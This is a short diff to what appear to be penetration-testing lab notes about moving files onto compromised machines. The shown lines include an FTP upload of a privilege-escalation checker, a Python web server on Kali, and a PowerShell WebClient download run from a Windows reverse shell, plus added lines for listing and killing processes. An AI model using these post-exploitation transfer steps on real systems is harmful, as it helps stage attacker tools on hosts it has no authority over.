@@ -23,6 +23,12 @@ ftp -4 -d -v ftp://offsec:offsec@127.0.0.1//linuxprichecker.py < ftp upload one 
 ### Powershell
 In Kali
 python -m SimpleHTTPServer 80
+
+  Stop services   
+  List PID of servies   
+    ps -l   
+    kill -9 PID   
+
 #### In reverse shell - Windows
 
 powershell.exe  (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip") 
